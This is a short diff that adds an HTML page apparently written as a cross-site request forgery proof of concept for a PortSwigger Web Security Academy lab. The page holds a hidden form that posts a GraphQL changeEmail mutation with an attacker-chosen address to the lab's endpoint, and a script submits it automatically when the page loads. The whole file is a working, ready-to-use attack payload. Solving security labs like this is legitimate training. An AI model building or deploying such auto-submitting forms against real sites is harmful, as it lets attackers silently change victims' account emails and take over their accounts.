@@ -1,0 +1,15 @@
+<html>
+<body>
+<form action="https://0a0c00a903017b0281997fd900510056.web-security-academy.net/graphql/v1"
+      method="POST">
+  <input type="hidden" name="query"
+    value="mutation changeEmail($input:ChangeEmailInput!){changeEmail(input:$input){email}}">
+  <input type="hidden" name="variables"
+    value='{"input":{"email":"honey@gmail.com"}}'>
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>
+</html>
+
